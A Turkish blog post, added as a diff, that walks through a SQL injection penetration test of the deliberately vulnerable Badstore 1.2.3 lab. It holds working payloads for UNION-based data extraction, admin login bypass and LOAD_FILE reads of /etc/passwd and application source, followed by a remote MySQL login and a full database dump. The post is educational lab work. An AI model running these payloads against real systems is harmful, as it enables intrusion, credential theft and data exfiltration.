@@ -1,0 +1,249 @@
+---
+name: Badstore 123!
+title: Badstore SQL BASED PENETRATION TESTING!
+description: Bu rapor, Badstore 1.2.3 platformu üzerinde gerçekleştirilen bir SQL Injection tabanlı sızma testi sürecini detaylandırmaktadır. Test sırasında, sistemdeki kullanıcı doğrulama mekanizmasının güvenlik zafiyetleri, veritabanı yapılandırması ve dosya okuma gibi kritik açıklar incelenmiştir. Elde edilen bilgiler, hassas kullanıcı verilerinin ve sistem dosyalarının izinsiz olarak erişilebilir olduğunu göstermiştir. Bu çalışma, sistem güvenliğini artırmak için gerekli önlemlerin alınmasının önemini vurgulamaktadır.
+category: Penetration Testing
+url: https://furkanibis.dev
+icon: https://i.sstatic.net/P0kqf.png
+image: https://i.sstatic.net/P0kqf.png
+author: Furkan İbiş
+date: Dec 14
+featured: true
+collab: false
+---
+
+# Badstore 1.2.3
+
+## Ufak tatlı açıklamalar
+
+Bugün sizlere Badstore 1.2.3 cihazına yönelik gerçekleştirdiğim SQL Injection tabanlı sızma testinin raporunu sunacağım.
+
+Badstore 1.2.3'ten bahsedecek olursak, kendisi bir online satış platformudur; ancak içerisinde birçok zafiyet barındırmaktadır.
+
+[Vulnhub](https://www.vulnhub.com) tarafından sunulan harika bir platformdur. Doğrudan indirmek isterseniz, şu bağlantıyı kullanabilirsiniz: [Badstore 1.2.3](https://www.vulnhub.com/entry/badstore-123,41/).
+
+VirtualBox üzerinde kurduğum iki adet cihazım var. Birisi, tahmin edebileceğiniz gibi Badstore'nin kendisi, diğeri ise bir Kali cihazı. Saldırılarımızı bu Kali cihazından gerçekleştireceğiz. Bu senaryo doğrultusunda, iki cihazın aynı ağda bulunduğunu varsayabilirsiniz.
+
+Sayfaya ilk girdiğimizde, zengin bir arayüze sahip olan Badstore'nin ana sayfası ile karşılaşıyoruz. 😊
+
+![](/20241214113752.png)
+Sayfa üzerinde kısa bir gezintinin ardından, ürün arama için oluşturulan metin kutusuna boş bir değerle arama yaptığımızda şu çıktıyı görüyoruz:
+
+![](/20241214114333.png)
+Burada yaşanan olayı kısaca özetlemek gerekirse, her ne kadar Badstore'nin backend tarafını görmüyor olsak da, Python ile şu kodlara benzer bir yapının çalıştığını söyleyebilirim:
+
+```python3
+user_inp = get_user_inp()
+sql_query = f"SELECT itemnum, sdesc, ldesc, price FROM itemdb WHERE '{user_inp}' IN (itemnum,sdesc,ldesc)"
+curr.execute(sql_query)
+items_user_wanted = curr.fetch_all()
+if len(items_user_wanted) > 0:
+	return items_user_wanted
+else:
+	return ('No items matched your search criteria:', sql_query)
+```
+
+Örnek olarak yazdığım bu kodda önemli bir sorun şudur: Kullanıcının girdiği arama kriteri arka planda bir kontrole tabi tutulmuyor ve doğrudan SQL sorgularının içerisine aktarılıyor. Peki, bu durum ne gibi sorunlara yol açabilir?
+
+Bu durum, uygulamanın **SQL Injection** saldırılarına açık hale gelmesine neden olur. Yani, saldırgan, arama kutusuna özel hazırlanmış SQL ifadeleri yazarak:
+
+1. **Veritabanındaki verilere yetkisiz erişim sağlayabilir** (örneğin, kullanıcı adları ve şifreler gibi hassas bilgileri görüntüleyebilir).
+2. **Veritabanında veri manipülasyonu yapabilir** (örneğin, kayıtları silebilir, güncelleyebilir veya yenilerini ekleyebilir).
+3. **Sisteme daha fazla zarar verebilecek komutları çalıştırabilir** (örneğin, veritabanı sunucusunun işletim sistemine erişim sağlayabilir).
+
+Bu nedenle, kullanıcı girdileri mutlaka doğrulanmalı ve SQL sorguları için **parametreli sorgular (prepared statements)** veya **ORM (Object-Relational Mapping)** araçları kullanılmalıdır.
+
+Aksi takdirde, yaptığınız uygulama kötü niyetli kişiler tarafından raporumuzun ilerleyen aşamalarında gerçekleştirdiğimiz işlemlere maruz kalabilir. Bu da sisteminizin veya uygulamanızın ciddi şekilde zarar görmesine yol açabilir. 😊
+
+
+## Sızma Testi
+
+Sistemimizde hangi veritabanının çalıştığını öğrenmek için, **nmap** aracını kullanıyorum. Bunun için aşağıdaki komutu çalıştırıyorum:
+```bash
+sudo nmap -sS -p- 192.168.1.116
+```
+![](/20241214130414.png)
+
+Hedef sistemimizin MySQL kullandığını bir kenara not alıyoruz. Bu bilgi, sonraki adımlarda sorgularımızı özelleştirmek için oldukça önemli. 😊
+
+Ufak açıklamaların ardından sıra bilgi edinme kısmına geldi. Bir sistem üzerinde ne kadar fazla bilgi sahibi olursak, o kadar güçlü bir saldırı gerçekleştirebileceğimiz kaçınılmaz bir gerçektir. Bu yazıda saldırı türümüz SQL Injection olduğundan, hedef sistemin kullandığı **SQL dili** ve **versiyonu**, ayrıca hangi **veritabanı yönetim sistemi (DBMS)** kullanıldığı gibi bilgiler bizim için kritik öneme sahiptir.
+
+Bu bilgiler, SQL Injection saldırılarını özelleştirmemize ve daha etkili hale getirmemize olanak tanır.
+
+`1'='1' #` komutu, SQL Injection için en temel denemelerden biri olarak bu yazıdaki ilk komutumuz olacak. Yaptığım denemelerde, `searchquery` içerisine bu komutu yazdığımda, sayfanın tüm ürünlerini gönderdiğini keşfettim. Bunun nedeni, sorgunun aşağıdaki hale gelmesi:
+
+```sql
+SELECT itemnum, sdesc, ldesc, price 
+FROM itemdb 
+WHERE '1'='1' # ' IN (itemnum, sdesc, ldesc)
+```
+
+Burada `#` işareti, SQL dilinde yorum satırı olarak kullanıldığından, sorgunun son kısmı dikkate alınmaz ve şu basitleştirilmiş hale gelir:
+
+```sql
+SELECT itemnum, sdesc, ldesc, price 
+FROM itemdb 
+WHERE '1'='1'
+```
+Bu durumda `'1'='1'` ifadesi her zaman doğru olduğundan, veritabanı tüm ürünleri döndürür. Bu da bize sayfanın barındırdığı tüm ürünlerin listelenmesini sağlar.
+
+**Önemli bir detay:** Yazdığım komutları doğrudan URL parametresine yazmadan önce, **online bir URL encoder** aracı kullanarak encode ettim. Çünkü, yanlış bir URL formatı yazıldığında, sayfa otomatik olarak sizi ana sayfaya yönlendiriyor. Bu, test işleminin düzgün çalışması için kritik bir adımdır. 😊
+
+![](/20241214122911.png)
+
+Amacımız şu anlık sayfadaki ürünlerle ilgilenmek değil, ancak sayfanın ilk sorgusundan aşağıdaki gibi bir yapı olduğunu anlıyoruz: 
+```sql
+SELECT itemnum, sdesc, ldesc, price 
+FROM itemdb 
+WHERE '' IN (itemnum,sdesc,ldesc)
+```
+sorgusunda sorgunun bize 4 adet kolon döndüğünü görüyoruz. Sıradaki hedefim bir UNION sorgusu olduğundan bu ufak bilgi bizim için önemli çünkü bildiğiniz üzere UNION 2 adet sorguyu birleştiren yegane bir komuttur ancak birleştirilen sorgulardan dönecek olan verilerin eşit kolon sayısına sahip olmaları gerekir.
+
+Sorgumu bu mantığa göre güncelliyorum ve aşağıdaki komutu `searchquery`'ye veriyorum:
+
+```sql
+1'='0' UNION SELECT 1,1,1,1 #
+```
+
+**Yaptıklarımı açıklayacak olursam:**
+
+1. `1='1'` ifadesini `1='0'` olarak değiştirmemin sebebi, ürünlerle ilgilenmek yerine kendi yazdığım SQL sorgularının döndürdüğü değeri görmek istememdir. Bu şekilde, ana sorgunun sonuçları boş olur ve UNION sorgusunun döndürdüğü değerler görünür hale gelir.
+2. `SELECT 1,1,1,1` ifadesi ise **ufak bir deneme** diyebiliriz. 😊 Bu, UNION ile birleşen sorgunun çalışıp çalışmadığını test etmek için kullanılıyor.
+3. `#` işareti, kalan kısmı yorumlayarak sorgunun geri kalanını devre dışı bırakıyor.
+
+Bu sorguyu çalıştırarak, aşağıdaki gibi bir çıktı elde ediyorum:  
+
+![](/20241214124021.png)
+Şimdi istediğimiz bilgileri elde etmek için deneyeceğimiz sorgulara geldi ilk başta hedef sistemin versiyonunu ve db ismini almak istiyoruz bunun için sorguya şunları ekliyoruz
+```sql
+1'='0' UNION SELECT VERSION(),1,1,1 UNION SELECT DATABASE(),1,1,1#
+```
+![](/20241214125849.png)
+Veritabanımızın adı **badstoredb** ve versiyonu **4.1.7-standard**. Ancak amacımız, ürünlerden ziyade kullanıcılarla ilgili bilgileri görmek olduğundan, bu bilgilerin saklandığı tabloyu bulmamız gerekiyor. Bunun için **information_schema** tablosunu kullanacağım ve sorgumu şu şekilde değiştiriyorum:
+
+```sql
+1'='0' UNION SELECT (SELECT TABLE_NAME 
+FROM INFORMATION_SCHEMA.TABLES
+WHERE TABLE_SCHEMA = 'badstoredb' LIMIT 1),1,1,1 #
+```
+Ancak ufak bir sorunumuz var:
+![](/20241214131243.png)
+Yaptığımız sorgularda MySQL 4.1.7-standard versiyonunu kullandığımızı tespit etmiştik. Derin araştırmalarım sonucunda sorunun kaynağını buldum: Information Schema, MySQL 5.0.2 versiyonunda eklendi. Yani, kısaca şu an Information Schema'mız mevcut değil. 😔
+
+Peki, kullanıcıların tutulduğu veritabanı tablosunu nasıl öğreneceğiz? İnsanlığın sahip olduğu en mütevazı yeteneklerden biriyle: 'doğaçlama'!
+
+İlk tespit ettiğimiz tablonun **itemdb** olduğunu biliyorduk. Bunun gibi, çeşitli tablo isimlerini denemeye başladım: **user**, **userdb**, **users**, **usersdb** gibi. Tahmin ettiğimiz gibi, tablomuzun adı **userdb**. Bunu, aşağıdaki sorgunun hata vermemesinden anlayabiliyoruz:
+```sql
+1'='0' UNION SELECT 1,1,1,1 FROM userdb #
+```
+![](/20241214180737.png)
+Peki, tablo ismini öğrendik, ancak bu tablonun kolonlarının isimleri neler? Bunu öğrenmek için yine **information_schema**'ya başvurabilirdik tabii ki, ancak yukarıdaki problemi tekrar yaşamaktan başka bir şey kazanamazdık. Bu nedenle farklı bir yaklaşım düşünmeliydim.
+
+Denediğim bazı yöntemler şunlardı, ancak yalnızca **syntax hataları** aldım. Muhtemelen bu MySQL versiyonunda bu yöntemler de desteklenmiyor:
+```sql
+SHOW COLUMNS.field FROM userdb
+DESCRIBE userdb
+```
+Bu durumda, kolon isimlerini öğrenmek için farklı bir strateji izlememiz gerekiyor.
+
+Çok sayıda deneme yaptım, ancak çoğu sonuç vermedi. Yine de sonunda şu işlemle sorunu çözmeyi başardım: Login sayfasında gezinirken, **Full Name** alanının `input` adının **fullname** olduğunu fark ettim. Bu gözlemle, bir deneme atışı yapmaya karar verdim:
+
+![](/20241214182147.png)
+```sql
+1'='0' UNION SELECT fullname,1,1,1 from userdb #
+```
+Bu sayede, ilk kolonumuzun adını bulmuş olduk. Daha sonra aynı yöntemi **email**, **passwd** ve **pwdhint** isimleriyle denediğimde başarılı sonuçlar elde ettim. Aşağıdaki sorguyu çalıştırdığımda ise kullanıcı bilgilerini içeren veriler karşıma çıktı. Kısaca sorgu şu şekildeydi:
+```sql
+1'='0' UNION SELECT fullname,email,passwd,pwdhint from userdb #
+```
+
+![](/20241214182036.png)
+
+Bu sorgu, tabloyu ve kolonları doğrulamakla kalmadı, aynı zamanda verileri de elde etmemi sağladı. 🎯
+
+Kullanıcılar arasında **admin** kullanıcısı dikkatimi çekti. Şimdi bu noktada çeşitli yöntemlerimiz var:
+
+1. **Hashlenmiş Şifreyi Çözmek:**  
+    Bunu **hash kırma araçları** veya **online hash kırıcılar** kullanarak çözmeyi deneyebiliriz.
+    
+2. **Brute Force veya Wordlist Tabanlı Hit:**  
+    Şifreyi brute force veya yaygın şifre listelerini (wordlist) kullanarak çözebiliriz. Özellikle admin kullanıcılarının zayıf şifreler kullandığı senaryolarda etkili olabilir.
+    
+
+Ancak, bu yöntemlerin ötesinde daha **güzel bir yaklaşım** var: Eğer SQL Injection aracılığıyla doğrudan şifre kontrol mekanizmasını atlayabilirsek, hash çözmeye gerek kalmadan sisteme erişim sağlayabiliriz! 😊 Bu, hedef sistemin login mantığını manipüle ederek admin oturumunu doğrudan ele geçirmeyi içerir.
+
+Yukarıda anlattığım yapıya benzer bir yapı çalışıyor diye tahmin ediyorum. Ancak kısaca yeniden açıklamak gerekirse, kullanıcının girdiği **email** ve **parola**, backend tarafında aşağıdaki gibi bir yapıya yerleştiriliyor olmalı:
+```python
+username, password = get_user_inp()
+sql_query = f"SELECT * FROM userdb WHERE email='{username}' AND passwd='{password}'"
+curr.execute(sql_query)
+user_exists = curr.fetch_all()
+if len(user_exists) > 0:
+	return items_user_wanted
+```
+Yine aynı mantık aslında; eğer kullanıcının girdiği inputlar kontrol edilmezse, sayfa yine manipüle edilebilir. **Admin** kullanıcısının email'inin `admin` olduğunu biliyorduk. Login sayfasında **Email Address** inputuna şu bilgiyi verirsek:
+```text
+admin' #
+```
+```sql
+SELECT * FROM userdb WHERE email='admin' #' AND ''=passwd
+```
+Kısaca temiz haliyle sorgu şu şekilde olur:
+```sql
+SELECT * FROM userdb WHERE email='admin'
+```
+![](/20241214184632.png)
+![](/20241214184645.png)
+Yukarıda görüldüğü gibi, SQL Injection yöntemiyle **admin** hesabına başarılı bir şekilde giriş yapmayı başardık. 🎯 Bu işlem, kullanıcı inputlarının kontrol edilmemesi ve sorgunun manipüle edilebilmesi nedeniyle mümkün oldu.
+
+Peki, daha ne kadar ileri gidebiliriz? MySQL'in **`LOAD_FILE`** isimli metodunu kullanarak hedef sistem içerisinde bilgi edinmek mümkün. Bu yöntem, veritabanı sunucusundaki dosyaları okuma imkanı sağlar. Örneğin, aşağıdaki komutla **`/etc/passwd`** dosyasından sistemle ilgili bilgileri elde edebiliriz:
+```sql
+1' = '0' UNION SELECT 1,1,1,LOAD_FILE('/etc/passwd') #
+```
+![](/20241214185847.png)
+Bu komutla, sistem üzerinde **2 adet kullanıcının** bulunduğunu görebiliyoruz: **root** ve **nobody** kullanıcıları. 
+
+Badstore üzerinde daha önce hata aldığımızda karşımıza çıkan **badstore.cgi** dosyasının içeriğini merak ediyorum. Bu dosyada neler olduğunu öğrenmek için aşağıdaki sorguyu çalıştırıyorum:
+```sql
+1' = '0' UNION SELECT 1,1,1,LOAD_FILE('/usr/local/apache/cgi-bin/badstore.cgi') #
+```
+![](/20241214190425.png)
+![](/20241214190456.png)
+
+
+Burada, elde ettiğimiz **badstore.cgi** dosyasının içeriğini inceliyor ve işimize yarayabilecek kısımları araştırıyorum. Bu tür dosyalar genellikle kritik bilgiler içerebilir. Tam da istediğim gibi bir bilgi buluyorum! 🎯
+
+![](/20241214190808.png)
+
+Hedef sistemimizin MySQL kullanıcı adı **root** ve parolası **secret** olarak tespit edildi. Bu bilgi, sisteme doğrudan erişim sağlamak için kritik bir adım! Ayrıca, backupların **/usr/local/apache/htdocs/backup/** klasörü altında bulunduğunu tespit ettik. Bu klasör, daha fazla bilgi edinmek ve potansiyel olarak hassas verilere erişmek için incelenebilir. Ancak, şu an hedef sisteme bağlanmayı tercih ediyorum.
+```bash
+mysql -u root -p -h 192.168.1.116 --skip_ssl
+```
+
+![](/20241214191421.png)
+
+Hedef cihazın MySQL'ine başarılı bir şekilde giriş yapmış olduk. 🎉 Artık, veritabanını keşfetmek ve potansiyel olarak kritik bilgilere erişmek için doğrudan sorgular çalıştırabiliriz.
+
+![](/20241214191722.png)
+
+Tüm bu veritabanı tablolarını tek tek incelemek yerine, artık veritabanının tüm verilerini kendi sistemime bir kopyasını oluşturmak ve bu sızma testini burada sonlandırmanın yeterli olacağını düşünüyorum.
+```bash
+mysqldump -h 192.168.1.116 -u root -p badstoredb > badstore_database.sql
+```
+Ve işlemimizi burada sonlandırıyorum. Kısaca, bu süreçte yaptığımız işlemleri özetleyecek olursak:
+
+### Gerçekleştirdiğimiz İşlemler:
+
+1. **Bilgilerini Bilmeden Kullanıcı Olarak Oturum Açmak**: SQL Injection yoluyla şifre doğrulamasını atlayarak admin dahil çeşitli kullanıcılarla oturum açtık.
+2. **Sunucudaki Dosyaları Okumak**: MySQL'in `LOAD_FILE` fonksiyonunu kullanarak sistemdeki kritik dosyaların içeriklerini görüntüledik.
+3. **Veritabanını Yedeklemek**: Veritabanının tam bir kopyasını alarak kendi sistemimize aktardık.
+4. **Hassas Bilgileri Görüntülemek**: Kullanıcı bilgileri, tablolar ve diğer önemli verileri elde ettik.
+
+---
+
+### Hala Yapılabilecek Diğer İşlemler:
+
+1. **Sistem Komutlarını Yürütmek**: Eğer MySQL kullanıcısının sistem seviyesinde yeterli yetkileri varsa, `sys_exec()` veya başka yöntemlerle komut yürütmek mümkün olabilir.
+2. **Veritabanını DROP Etmek**: Veritabanını tamamen silmek.
+3. **Yeni Kayıt Eklemek veya Olan Kayıtları Güncellemek**: Veritabanına kötü amaçlı veya manipüle edilmiş veriler eklemek.
+---
